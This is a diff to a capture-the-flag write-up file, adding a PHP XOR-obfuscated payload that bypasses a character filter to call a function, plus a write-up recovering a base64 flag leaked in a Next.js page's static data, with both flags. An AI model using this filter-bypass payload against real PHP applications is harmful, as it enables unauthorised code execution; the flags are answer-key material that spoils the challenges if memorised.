@@ -188,7 +188,7 @@ from Crypto.Util.strxor import strxor
 import string
 
 fun = "secret_function"
-lis = """'_.@/{}()=*,-:<>?["]|"""
+lis = """~$`'-.@/(|)=*,_:?<>{}["]"""
 nope = string.ascii_lowercase + string.ascii_uppercase + string.digits
 final = ""
 final2 = ""
@@ -208,9 +208,43 @@ req = requests.get(url)
 print(req.text[req.text.find('ictf'):])
 ```
 
+payload
+
+```
+$_=']:<_:[{[[@<[)/@'^'.__-_/$=.._/@@.';$_();
+```
+
 ## flag 
 
 `ictf{th3r3_4r3_n0_l4ngu4g3_l1k3_Php}`
 
 <br>
 
+# What Next
+
+## Description
+
+Threw together a blog framework this afternoon
+
+## Attachments
+
+`https://imaginaryctf.org/f/5zCIW`
+`https://what-next.ictf.iciaran.com/`
+
+## Solution
+
+Checking the source code of `/signin` shows us the base64 encoded flag.
+
+```
+<script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"title":"Flag","content":"\u003ch1\u003eFlag\u003c/h1\u003e\n\u003ch2\u003eIs this what you're looking for?\u003c/h2\u003e\n\u003cp\u003eaWN0ZntzbjM0a3lfc3Q0dDFjX2czbjNyNHQxMG59Cg==\u003c/p\u003e\n\u003ch2\u003eThe code for this challenge is heavily ripped off from\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vercel/next.js/tree/canary/examples/blog-starter\"\u003enext.js blog starter\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://dev.to/ivandotv/protecting-static-pages-in-next-js-application-1e50\"\u003eProtecting static pages in Next.js application\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","isProtected":true},"__N_SSG":true},"page":"/protected/[post]","query":{"post":"flag"},"buildId":"aMlWiprh_tXshfanKQ28N","isFallback":false,"gsp":true,"scriptLoader":[]}</script>
+```
+
+```
+aWN0ZntzbjM0a3lfc3Q0dDFjX2czbjNyNHQxMG59Cg==
+```
+
+## flag
+
+`ictf{sn34ky_st4t1c_g3n3r4t10n}`
+
+<br>
